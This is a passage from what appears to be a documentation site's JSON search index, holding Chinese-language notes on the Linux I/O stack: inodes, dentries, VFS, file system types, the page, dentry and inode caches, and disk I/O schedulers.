\u5927\u5c0f\uff0c\u5982\u679c\u6bcf\u6b21\u90fd\u8bfb\u5199\u8fd9\u4e48\u5c0f\u7684\u5355\u4f4d\uff0c\u6548\u7387\u4e00\u5b9a\u5f88\u4f4e\u3002\u6240\u4ee5\uff0c\u6587\u4ef6\u7cfb\u7edf\u53c8\u628a\u8fde\u7eed\u7684\u6247\u533a\u7ec4\u6210\u4e86\u903b\u8f91\u5757\uff0c\u7136\u540e\u6bcf\u6b21\u90fd\u4ee5\u903b\u8f91\u5757\u4e3a\u6700\u5c0f\u5355\u5143\uff0c\u6765\u7ba1\u7406\u6570\u636e\u3002\u5e38\u89c1\u7684\u903b\u8f91\u5757\u5927\u5c0f\u4e3a 4KB\uff0c\u4e5f\u5c31\u662f\u7531\u8fde\u7eed\u7684 8 \u4e2a\u6247\u533a\u7ec4\u6210\u3002 \u7b2c\u4e00\uff0c\u76ee\u5f55\u9879\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5185\u5b58\u7f13\u5b58\uff0c\u800c\u7d22\u5f15\u8282\u70b9\u5219\u662f\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\u7684\u6570\u636e\u3002\u5728\u524d\u9762\u7684 Buffer \u548c Cache \u539f\u7406\u4e2d\uff0c\u6211\u66fe\u7ecf\u63d0\u5230\u8fc7\uff0c\u4e3a\u4e86\u534f\u8c03\u6162\u901f\u78c1\u76d8\u4e0e\u5feb\u901f CPU \u7684\u6027\u80fd\u5dee\u5f02\uff0c\u6587\u4ef6\u5185\u5bb9\u4f1a\u7f13\u5b58\u5230\u9875\u7f13\u5b58 Cache \u4e2d\u3002 \u90a3\u4e48\uff0c\u8fd9\u4e9b\u7d22\u5f15\u8282\u70b9\u81ea\u7136\u4e5f\u4f1a\u7f13\u5b58\u5230\u5185\u5b58\u4e2d\uff0c\u52a0\u901f\u6587\u4ef6\u7684\u8bbf\u95ee\u3002 \u7b2c\u4e8c\uff0c\u78c1\u76d8\u5728\u6267\u884c\u6587\u4ef6\u7cfb\u7edf\u683c\u5f0f\u5316\u65f6\uff0c\u4f1a\u88ab\u5206\u6210\u4e09\u4e2a\u5b58\u50a8\u533a\u57df\uff0c\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u533a\u548c\u6570\u636e\u5757\u533a\u3002\u5176\u4e2d\uff0c \u8d85\u7ea7\u5757\uff0c\u5b58\u50a8\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u72b6\u6001\u3002 \u7d22\u5f15\u8282\u70b9\u533a\uff0c\u7528\u6765\u5b58\u50a8\u7d22\u5f15\u8282\u70b9\u3002 \u6570\u636e\u5757\u533a\uff0c\u5219\u7528\u6765\u5b58\u50a8\u6587\u4ef6\u6570\u636e\u3002 \u6587\u4ef6\u7cfb\u7edf\uff0c\u672c\u8eab\u662f\u5bf9\u5b58\u50a8\u8bbe\u5907\u4e0a\u7684\u6587\u4ef6\uff0c\u8fdb\u884c\u7ec4\u7ec7\u7ba1\u7406\u7684\u673a\u5236\u3002\u7ec4\u7ec7\u65b9\u5f0f\u4e0d\u540c\uff0c\u5c31\u4f1a\u5f62\u6210\u4e0d\u540c\u7684\u6587\u4ef6\u7cfb\u7edf\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c\u7d22\u5f15\u8282\u70b9\u662f\u6bcf\u4e2a\u6587\u4ef6\u7684\u552f\u4e00\u6807\u5fd7\uff0c\u800c\u76ee\u5f55\u9879\u7ef4\u62a4\u7684\u6b63\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6811\u72b6\u7ed3\u6784\u3002\u76ee\u5f55\u9879\u548c\u7d22\u5f15\u8282\u70b9\u7684\u5173\u7cfb\u662f\u591a\u5bf9\u4e00\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff0c\u4e00\u4e2a\u6587\u4ef6\u53ef\u4ee5\u6709\u591a\u4e2a\u522b\u540d\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u786c\u94fe\u63a5\u4e3a\u6587\u4ef6\u521b\u5efa\u7684\u522b\u540d\uff0c\u5c31\u4f1a\u5bf9\u5e94\u4e0d\u540c\u7684\u76ee\u5f55\u9879\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u76ee\u5f55\u9879\u672c\u8d28\u4e0a\u8fd8\u662f\u94fe\u63a5\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\uff0c\u5b83\u4eec\u7684\u7d22\u5f15\u8282\u70b9\u76f8\u540c\u3002 \u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u7ea7\u7f13\u5b58 \u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff1aVFS\u7ed9\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e86\u901a\u7528\u7684\u63a5\u53e3\uff0c\u7528\u6237\u7a0b\u5e8f\u548c\u5185\u6838\u5176\u4ed6\u5b50\u7cfb\u7edf\u4e0d\u9700\u8981\u4e86\u89e3\u5404\u79cd\u6587\u4ef6\u7cfb\u7edf\u7684\u5b9e\u73b0\u7ec6\u8282\uff0c\u901a\u8fc7VFS\u63d0\u4f9b\u7684\u63a5\u53e3\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7cfb\u7edf\u7684\u8c03\u7528\uff0cVFS\u662f\u5904\u4e8e\u7cfb\u7edf\u8c03\u7528\u548c\u6587\u4ef6\u7cfb\u7edf\u4e2d\u95f4\u7684\u4e00\u4e2a\u62bd\u8c61\u5c42\uff0cEXT3\u3001EXT4\u3001NFS\u7b49\u6587\u4ef6\u7cfb\u7edf\u9700\u8981\u6302\u8f7d\u5230VFS\u76ee\u5f55\u6811\u4e2d\u7684\u67d0\u4e2a\u5b50\u76ee\u5f55\u4e0b\u9762\u624d\u80fd\u88ab\u4f7f\u7528\uff0c\u6bd4\u5982LINUX\u7cfb\u7edf\u7684\u6839\u76ee\u5f55/ \u8fd9\u4e9b\u6587\u4ef6\u7cfb\u7edf\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\u3002 \u7b2c\u4e00\u7c7b\u662f\u57fa\u4e8e\u78c1\u76d8\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u628a\u6570\u636e\u76f4\u63a5\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u672c\u5730\u6302\u8f7d\u7684\u78c1\u76d8\u4e2d\u3002\u5e38\u89c1\u7684 Ext4\u3001XFS\u3001OverlayFS \u7b49\uff0c\u90fd\u662f\u8fd9\u7c7b\u6587\u4ef6\u7cfb\u7edf\u3002 \u7b2c\u4e8c\u7c7b\u662f\u57fa\u4e8e\u5185\u5b58\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u3002\u8fd9\u7c7b\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u78c1\u76d8\u5206\u914d\u5b58\u50a8\u7a7a\u95f4\uff0c\u4f46\u4f1a\u5360\u7528\u5185\u5b58\u3002\u6211\u4eec\u7ecf\u5e38\u7528\u5230\u7684 /proc \u6587\u4ef6\u7cfb\u7edf\uff0c\u5176\u5b9e\u5c31\u662f\u4e00\u79cd\u6700\u5e38\u89c1\u7684\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u3002\u6b64\u5916\uff0c/sys \u6587\u4ef6\u7cfb\u7edf\u4e5f\u5c5e\u4e8e\u8fd9\u4e00\u7c7b\uff0c\u4e3b\u8981\u5411\u7528\u6237\u7a7a\u95f4\u5bfc\u51fa\u5c42\u6b21\u5316\u7684\u5185\u6838\u5bf9\u8c61\u3002 \u7b2c\u4e09\u7c7b\u662f\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\u6570\u636e\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u6bd4\u5982 NFS\u3001SMB\u3001iSCSI \u7b49\u3002 \u8fd9\u4e9b\u6587\u4ef6\u7cfb\u7edf\uff0c\u8981\u5148\u6302\u8f7d\u5230 VFS \u76ee\u5f55\u6811\u4e2d\u7684\u67d0\u4e2a\u5b50\u76ee\u5f55\uff08\u79f0\u4e3a\u6302\u8f7d\u70b9\uff09\uff0c\u7136\u540e\u624d\u80fd\u8bbf\u95ee\u5176\u4e2d\u7684\u6587\u4ef6\u3002\u62ff\u7b2c\u4e00\u7c7b\uff0c\u4e5f\u5c31\u662f\u57fa\u4e8e\u78c1\u76d8\u7684\u6587\u4ef6\u7cfb\u7edf\u4e3a\u4f8b\uff0c\u5728\u5b89\u88c5\u7cfb\u7edf\u65f6\uff0c\u8981\u5148\u6302\u8f7d\u4e00\u4e2a\u6839\u76ee\u5f55\uff08/\uff09\uff0c\u5728\u6839\u76ee\u5f55\u4e0b\u518d\u628a\u5176\u4ed6\u6587\u4ef6\u7cfb\u7edf\uff08\u6bd4\u5982\u5176\u4ed6\u7684\u78c1\u76d8\u5206\u533a\u3001/proc \u6587\u4ef6\u7cfb\u7edf\u3001/sys \u6587\u4ef6\u7cfb\u7edf\u3001NFS \u7b49\uff09\u6302\u8f7d\u8fdb\u6765\u3002 \u7f13\u5b58\uff1a\u4e3a\u4e86\u534f\u8c03\u5feb\u901fCPU\u53ca\u6162\u901f\u78c1\u76d8\u4e4b\u95f4\u7684\u6027\u80fd\u5dee\u5f02\uff0cLINUX\u6587\u4ef6\u7cfb\u7edf\u901a\u8fc7\u5404\u79cd\u7f13\u5b58\u5b9e\u73b0\u6587\u4ef6\u7684\u5feb\u901f\u8bbf\u95ee\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u9875\u7f13\u5b58\uff1a\u7f13\u5b58\u4e86\u865a\u62df\u5185\u5b58\u9875\u9762\uff0c\u5176\u4e2d\u5305\u62ec\u4e86\u6587\u4ef6\u7cfb\u7edf\u7684\u9875\u9762\uff0c\u63d0\u5347\u4e86\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6027\u80fd\uff0c\u5f53\u7cfb\u7edf\u7cfb\u7edf\u5185\u5b58\u4e0d\u8db3\u65f6\uff0c\u9875\u7f13\u5b58\u662f\u53ef\u4ee5\u56de\u6536\u7684\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1agrep \"Cached\" /proc/meminfo \u67e5\u770b\u7cfb\u7edf\u9875\u7f13\u5b58\u5927\u5c0f \u76ee\u5f55\u9879\u7f13\u5b58\uff1adentry\u8bb0\u5f55\u4e86\u4ece\u76ee\u5f55\u9879\u5230VFS inode\u7684\u6620\u5c04\u5173\u7cfb\uff0c\u63d0\u9ad8\u4e86\u8def\u5f84\u540d\u67e5\u627e\u7684\u6027\u80fd\uff0c \u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1a grep \"dentry\" /proc/slabinfo \u67e5\u770b\u7cfb\u7edf\u76ee\u5f55\u9879\u7f13\u5b58\u5927\u5c0f \u7d22\u5f15\u8282\u70b9\u7f13\u5b58\uff1a inode_cache\u7f13\u5b58\u7684\u5bf9\u8c61\u662finode\uff0c\u5305\u62ec\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u3001\u66f4\u65b0\u65f6\u95f4\u6233\u3001\u6587\u4ef6\u5927\u5c0f\u7b49\u4fe1\u606f\uff0c\u53ef\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\uff1agrep \"inode_cache\" /proc/slabinfo\u67e5\u770b\u7d22\u5f15\u8282\u70b9\u7f13\u5b58\u5927\u5c0f \u6587\u4ef6\u7f13\u5b58\u662f\u8fd9\u4e48\u8ba1\u7b97\u7684 /proc/meminfo\u4e2d 11 Active(file): 728232 kB 12 Inactive(file): 400104 kB \u8fd9\u4e24\u4e2a\u503c\u5f97\u603b\u548c \u78c1\u76d8IO \u5728linux\u7cfb\u7edf\u4e2d\u78c1\u76d8\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5757\u8bbe\u5907\u6765\u7ba1\u7406\u7684\uff0c\u4ee5\u5757\u4e3a\u5355\u4f4d\u8bfb\u5199\u6570\u636e\uff0c\u4e3a\u4e86\u51cf\u5c11\u4e0d\u540c\u7684\u5757\u8bbe\u5907\u5dee\u5f02\u5e26\u6765\u7684\u5f71\u54cd\uff0c\u7c7b\u4f3c\u865a\u62df\u6587\u4ef6\u7cfb\u7edfVFS\uff0clinux\u901a\u8fc7\u4e00\u4e2a\u7edf\u4e00\u7684\u901a\u7528\u5757\u5c42\u6765\u7ba1\u7406\u5404\u79cd\u5757\u8bbe\u5907\uff0c\u4e3b\u8981\u529f\u80fd\u5982\u4e0b\uff1a \u4e3a\u6587\u4ef6\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u8bbf\u95ee\u5757\u8bbe\u5907\u7684\u6807\u51c6\u63a5\u53e3\uff0c\u5c06\u5404\u79cd\u78c1\u76d8\u8bbe\u5907\u62bd\u8c61\u4e3a\u7edf\u4e00\u7684\u5757\u8bbe\u5907\u6765\u7ba1\u7406 \u5bf9I/O\u8bf7\u6c42\u8fdb\u884c\u8c03\u5ea6\uff0c\u901a\u8fc7\u91cd\u65b0\u6392\u5e8f\uff0c\u8bf7\u6c42\u5408\u5e76\u7b49\u63aa\u65bd\u4f18\u5316\u78c1\u76d8\u8bfb\u5199\u6548\u7387 I/O\u8c03\u5ea6\u5668\u5bf9I/O\u8bf7\u6c42\u8fdb\u884c\u6392\u5e8f\uff0c\u5177\u4f53\u7531\u91c7\u7528\u7684\u8c03\u5ea6\u7b56\u7565\u51b3\u5b9a\uff0c\u4e3b\u8981\u7b56\u7565\u5982\u4e0b None\uff1a\u4e0d\u505a\u4efb\u4f55\u8c03\u5ea6\uff0c\u5e38\u7528\u4e8e\u865a\u62df\u673a\uff0c\u78c1\u76d8I/O\u8c03\u5ea6\u53d6\u51b3\u4e86\u5bbf\u4e3b\u7269\u7406\u673a\u7b56\u7565 Noop\uff1a\u4e00\u4e2a\u5148\u5165\u5148\u51fa\u7684\u961f\u5217\uff0c\u53ea\u505a\u4e00\u4e9b\u57fa\u672c\u7684\u8bf7\u6c42\u5408\u5e76\uff0c\u9002\u7528\u4e8eSSD\u78c1\u76d8 Deadline\uff1a\u4e3a\u6bcf\u4e2aI/O\u8bf7\u6c42\u5ef6\u65f6\u8bbe\u5b9a\u622a\u6b62\u65f6\u95f4\uff0c\u5c06\u8981\u8fbe\u5230\u622a\u6b62\u65f6\u95f4\u7684\u8bf7\u6c42\u88ab\u4f18\u5148\u5904\u7406\uff0c\u5171\u4f7f\u7528\u4e09\u4e2a\u961f\u5217\uff1a\u8bfbFIFO\u3001\u5199FIFO\u548c\u6392\u5e8f\u961f\u5217\uff0c\u901a\u5e38\u9002\u7528\u4e8eI/O\u6c42\u60c5\u5927\u91cf\u7684\u4e1a\u52a1\uff0c\u6bd4\u5982\u6570\u636e\u5e93 Cfq\uff1a\u5b8c\u5168\u516c\u5e73\u961f\u5217\u8c03\u5ea6\u628aI/O\u65f6\u95f4\u7247\u5206\u914d\u7ed9\u8fdb\u7a0b\uff0c\u786e\u4fdd\u78c1\u76d8\u8d44\u6e90\u7684\u516c\u5e73\u4f7f\u7528\uff0c\u901a\u5e38\u4f5c\u4e3a\u9ed8\u8ba4\u9009\u9879\uff0c\u53ef\u901a\u8fc7ionice\u547d\u4ee4\u5bf9\u7528\u6237\u8fdb\u7a0b\u8bbe\u5b9a\u4f18\u5148\u7ea7\u548c\u7c7b\u522b","title":"IO\u6280\u672f\u6808"},{"location":"system/linux/IO/IO%E6%8A%80%E6%9C%AF%E6%A0%88/#io","text":"\u63d0\u4f9b\u4e86\u8f6f\u4ef6\u4e0e\u5176\u5b83\u6570\u636e\u5b58\u50a8\u4ecb\u8d28\u4ea4\u6362\u6570\u636e\u7684\u80fd\u529b Linux\u7cfb\u7edfI/O\u6808\u4e3b\u8981\u5305\u62ec\u78c1\u76d8\u548c\u6587\u4ef6\u7cfb\u7edf\uff1a 1.\u78c1\u76d8\uff1a\u4e3a\u7cfb\u7edf\u6570\u636e\u63d0\u4f9b\u6301\u4e45\u5316\u5b58\u50a8\uff0c\u5728linux\u7cfb\u7edf\u4e2d\u78c1\u76d8\u662f\u4f5c\u4e3a\u4e00\u4e2a\u5757\u8bbe\u5907\u6765\u7ba1\u7406\u7684\uff0c\u4ee5\u5757\u4e3a\u5355\u4f4d\u8bfb\u5199\u6570\u636e\uff0c\u901a\u5e38\u5305\u62ec\u672c\u5730\u78c1\u76d8\u8bbe\u5907\u548c\u7f51\u7edc\u5b58\u50a8 2.\u6587\u4ef6\u7cfb\u7edf\uff1a\u63d0\u4f9b\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7684\u6811\u72b6\u7ed3\u6784\uff0c\u5728linux\u7cfb\u7edf\u4e2d\uff0c\u4e00\u5207\u7686\u6587\u4ef6\uff0c\u666e\u901a\u7684\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5757\u8bbe\u5907\u3001\u5957\u63a5\u5b57\u4ee5\u53ca\u7ba1\u9053\u90fd\u662f\u901a\u8fc7\u7edf\u4e00\u7684\u6587\u4ef6\u7cfb\u7edf\u7ba1\u7406\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u90fd\u5206\u914d\u4e00\u4e2a\u7d22\u5f15\u8282\u70b9\u53ca\u4e00\u4e2a\u76ee\u5f55\u9879\u6570\u636e\u7ed3\u6784\uff0c\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u5143\u4fe1\u606f\u53ca\u76ee\u5f55\u7ed3\u6784\uff1a \u7d22\u5f15\u8282\u70b9\uff1ainode\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u4fee\u6539\u65e5\u671f\uff0c\u8bbf\u95ee\u6743\u9650\u3001\u6570\u636e\u4f4d\u7f6e\u7b49\u5143\u4fe1\u606f\uff0cinode\u8ddf\u6587\u4ef6\u4e00\u4e00\u5bf9\u5e94\uff0cinode\u4fe1\u606f\u4e5f\u8981\u6301\u4e45\u5316\u5b58\u50a8\u5230\u78c1\u76d8 \u76ee\u5f55\u9879\u7ed3\u6784\uff1adentry\u7528\u6765\u8bb0\u5f55\u6587\u4ef6\u7684\u540d\u5b57\u3001\u7d22\u5f15\u8282\u70b9\u6307\u9488\u4ee5\u53ca\u4e0e\u5176\u4ed6\u76ee\u5f55\u9879\u7684\u5173\u8054\u5173\u7cfb\uff0c\u76ee\u5f55\u9879\u5b58\u50a8\u5728\u5185\u5b58\u4e2d \u6362\u53e5\u8bdd\u8bf4\uff0c\u7d22\u5f15\u8282\u70b9\u662f\u6bcf\u4e2a\u6587\u4ef6\u7684\u552f\u4e00\u6807\u5fd7\uff0c\u800c\u76ee\u5f55\u9879\u7ef4\u62a4\u7684\u6b63\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6811\u72b6\u7ed3\u6784\u3002\u76ee\u5f55\u9879\u548c\u7d22\u5f15\u8282\u70b9\u7684\u5173\u7cfb\u662f\u591a\u5bf9\u4e00\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff0c\u4e00\u4e2a\u6587\u4ef6\u53ef\u4ee5\u6709\u591a\u4e2a\u522b\u540d\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u786c\u94fe\u63a5\u4e3a\u6587\u4ef6\u521b\u5efa\u7684\u522b\u540d\uff0c\u5c31\u4f1a\u5bf9\u5e94\u4e0d\u540c\u7684\u76ee\u5f55\u9879\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u76ee\u5f55\u9879\u672c\u8d28\u4e0a\u8fd8\u662f\u94fe\u63a5\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\uff0c\u5b83\u4eec\u7684\u7d22\u5f15\u8282\u70b9\u76f8\u540c\u3002 \u7d22\u5f15\u8282\u70b9\u548c\u76ee\u5f55\u9879\u7eaa\u5f55\u4e86\u6587\u4ef6\u7684\u5143\u6570\u636e\uff0c\u4ee5\u53ca\u6587\u4ef6\u95f4\u7684\u76ee\u5f55\u5173\u7cfb\uff0c\u90a3\u4e48\u5177\u4f53\u6765\u8bf4\uff0c\u6587\u4ef6\u6570\u636e\u5230\u5e95\u662f\u600e\u4e48\u5b58\u50a8\u7684\u5462\uff1f\u662f\u4e0d\u662f\u76f4\u63a5\u5199\u5230\u78c1\u76d8\u4e2d\u5c31\u597d\u4e86\u5462\uff1f \u5b9e\u9645\u4e0a\uff0c\u78c1\u76d8\u8bfb\u5199\u7684\u6700\u5c0f\u5355\u4f4d\u662f\u6247\u533a\uff0c\u7136\u800c\u6247\u533a\u53ea\u6709 512B \u5927\u5c0f\uff0c\u5982\u679c\u6bcf\u6b21\u90fd\u8bfb\u5199\u8fd9\u4e48\u5c0f\u7684\u5355\u4f4d\uff0c\u6548\u7387\u4e00\u5b9a\u5f88\u4f4e\u3002\u6240\u4ee5\uff0c\u6587\u4ef6\u7cfb\u7edf\u53c8\u628a\u8fde\u7eed\u7684\u6247\u533a\u7ec4\u6210\u4e86\u903b\u8f91\u5757\uff0c\u7136\u540e\u6bcf\u6b21\u90fd\u4ee5\u903b\u8f91\u5757\u4e3a\u6700\u5c0f\u5355\u5143\uff0c\u6765\u7ba1\u7406\u6570\u636e\u3002\u5e38\u89c1\u7684\u903b\u8f91\u5757\u5927\u5c0f\u4e3a 4KB\uff0c\u4e5f\u5c31\u662f\u7531\u8fde\u7eed\u7684 8 \u4e2a\u6247\u533a\u7ec4\u6210\u3002 \u7b2c\u4e00\uff0c\u76ee\u5f55\u9879\u672c\u8eab\u5c31\u662f\u4e00\u4e2a\u5185\u5b58\u7f13\u5b58\uff0c\u800c\u7d22\u5f15\u8282\u70b9\u5219\u662f\u5b58\u50a8\u5728\u78c1\u76d8\u4e2d\u7684\u6570\u636e\u3002\u5728\u524d\u9762\u7684 Buffer \u548c Cache \u539f\u7406\u4e2d\uff0c\u6211\u66fe\u7ecf\u63d0\u5230\u8fc7\uff0c\u4e3a\u4e86\u534f\u8c03\u6162\u901f\u78c1\u76d8\u4e0e\u5feb\u901f CPU \u7684\u6027\u80fd\u5dee\u5f02\uff0c\u6587\u4ef6\u5185\u5bb9\u4f1a\u7f13\u5b58\u5230\u9875\u7f13\u5b58 Cache \u4e2d\u3002 \u90a3\u4e48\uff0c\u8fd9\u4e9b\u7d22\u5f15\u8282\u70b9\u81ea\u7136\u4e5f\u4f1a\u7f13\u5b58\u5230\u5185\u5b58\u4e2d\uff0c\u52a0\u901f\u6587\u4ef6\u7684\u8bbf\u95ee\u3002 \u7b2c\u4e8c\uff0c\u78c1\u76d8\u5728\u6267\u884c\u6587\u4ef6\u7cfb\u7edf\u683c\u5f0f\u5316\u65f6\uff0c\u4f1a\u88ab\u5206\u6210\u4e09\u4e2a\u5b58\u50a8\u533a\u57df\uff0c\u8d85\u7ea7\u5757\u3001\u7d22\u5f15\u8282\u70b9\u533a\u548c\u6570\u636e\u5757\u533a\u3002\u5176\u4e2d\uff0c \u8d85\u7ea7\u5757\uff0c\u5b58\u50a8\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u7684\u72b6\u6001\u3002 \u7d22\u5f15\u8282\u70b9\u533a\uff0c\u7528\u6765\u5b58\u50a8\u7d22\u5f15\u8282\u70b9\u3002 \u6570\u636e\u5757\u533a\uff0c\u5219\u7528\u6765\u5b58\u50a8\u6587\u4ef6\u6570\u636e\u3002 \u6587\u4ef6\u7cfb\u7edf\uff0c\u672c\u8eab\u662f\u5bf9\u5b58\u50a8\u8bbe\u5907\u4e0a\u7684\u6587\u4ef6\uff0c\u8fdb\u884c\u7ec4\u7ec7\u7ba1\u7406\u7684\u673a\u5236\u3002\u7ec4\u7ec7\u65b9\u5f0f\u4e0d\u540c\uff0c\u5c31\u4f1a\u5f62\u6210\u4e0d\u540c\u7684\u6587\u4ef6\u7cfb\u7edf\u3002 \u6362\u53e5\u8bdd\u8bf4\uff0c\u7d22\u5f15\u8282\u70b9\u662f\u6bcf\u4e2a\u6587\u4ef6\u7684\u552f\u4e00\u6807\u5fd7\uff0c\u800c\u76ee\u5f55\u9879\u7ef4\u62a4\u7684\u6b63\u662f\u6587\u4ef6\u7cfb\u7edf\u7684\u6811\u72b6\u7ed3\u6784\u3002\u76ee\u5f55\u9879\u548c\u7d22\u5f15\u8282\u70b9\u7684\u5173\u7cfb\u662f\u591a\u5bf9\u4e00\uff0c\u4f60\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\uff0c\u4e00\u4e2a\u6587\u4ef6\u53ef\u4ee5\u6709\u591a\u4e2a\u522b\u540d\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u901a\u8fc7\u786c\u94fe\u63a5\u4e3a\u6587\u4ef6\u521b\u5efa\u7684\u522b\u540d\uff0c\u5c31\u4f1a\u5bf9\u5e94\u4e0d\u540c\u7684\u76ee\u5f55\u9879\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u76ee\u5f55\u9879\u672c\u8d28\u4e0a\u8fd8\u662f\u94fe\u63a5\u540c\u4e00\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\uff0c\u5b83\u4eec\u7684\u7d22\u5f15\u8282\u70b9\u76f8\u540c\u3002","title":"I/O\u6808"},{"location":"system/linux/IO/IO%E6%8A%80%E6%9C%AF%E6%A0%88/#_1","text":"\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff1aVFS\u7ed9\u4e0d\u540c\u7c7b\u578b\u7684\u6587\u4ef6\u7cfb\u7edf\u63d0\u4f9b\u4e86\u901a\u7528\u7684\u63a5\u53e3\uff0c\u7528\u6237\u7a0b\u5e8f\u548c\u5185\u6838\u5176\u4ed6\u5b50\u7cfb\u7edf\u4e0d\u9700\u8981\u4e86\u89e3\u5404\u79cd\u6587\u4ef6\u7cfb\u7edf\u7684\u5b9e\u73b0\u7ec6\u8282\uff0c\u901a\u8fc7VFS\u63d0\u4f9b\u7684\u63a5\u53e3\u5c31\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7cfb\u7edf\u7684\u8c03\u7528\uff0cVFS\u662f\u5904\u4e8e\u7cfb\u7edf\u8c03\u7528\u548c\u6587\u4ef6\u7cfb\u7edf\u4e2d\u95f4\u7684\u4e00\u4e2a\u62bd\u8c61\u5c42\uff0cEXT3\u3001EXT4\u3001NFS\u7b49\u6587\u4ef6\u7cfb\u7edf\u9700\u8981\u6302\u8f7d\u5230VFS\u76ee\u5f55\u6811\u4e2d\u7684\u67d0\u4e2a\u5b50\u76ee\u5f55\u4e0b\u9762\u624d\u80fd\u88ab\u4f7f\u7528\uff0c\u6bd4\u5982LINUX\u7cfb\u7edf\u7684\u6839\u76ee\u5f55/ \u8fd9\u4e9b\u6587\u4ef6\u7cfb\u7edf\u53ef\u4ee5\u5206\u4e3a\u4e09\u7c7b\u3002 \u7b2c\u4e00\u7c7b\u662f\u57fa\u4e8e\u78c1\u76d8\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u628a\u6570\u636e\u76f4\u63a5\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u672c\u5730\u6302\u8f7d\u7684\u78c1\u76d8\u4e2d\u3002\u5e38\u89c1\u7684 Ext4\u3001XFS\u3001OverlayFS \u7b49\uff0c\u90fd\u662f\u8fd9\u7c7b\u6587\u4ef6\u7cfb\u7edf\u3002 \u7b2c\u4e8c\u7c7b\u662f\u57fa\u4e8e\u5185\u5b58\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u3002\u8fd9\u7c7b\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u78c1\u76d8\u5206\u914d\u5b58\u50a8\u7a7a\u95f4\uff0c\u4f46\u4f1a\u5360\u7528\u5185\u5b58\u3002\u6211\u4eec\u7ecf\u5e38\u7528\u5230\u7684 /proc \u6587\u4ef6\u7cfb\u7edf\uff0c\u5176\u5b9e\u5c31\u662f\u4e00\u79cd\u6700\u5e38\u89c1\u7684\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\u3002\u6b64\u5916\uff0c/sys \u6587\u4ef6\u7cfb\u7edf\u4e5f\u5c5e\u4e8e\u8fd9\u4e00\u7c7b\uff0c\u4e3b\u8981\u5411\u7528\u6237\u7a7a\u95f4\u5bfc\u51fa\u5c42\u6b21\u5316\u7684\u5185\u6838\u5bf9\u8c61\u3002 \u7b2c\u4e09\u7c7b\u662f\u7f51\u7edc\u6587\u4ef6\u7cfb\u7edf\uff0c\u4e5f\u5c31\u662f\u7528\u6765\u8bbf\u95ee\u5176\u4ed6\u8ba1\u7b97\u673a\u6570\u636e\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u6bd4\u5982 NFS\u3001SMB\u3001iSCSI \u7b49\u3002 \u8fd9\u4e9b\u6587\u4ef6\u7cfb\u7edf\uff0c\u8981\u5148\u6302\u8f7d\u5230 VFS 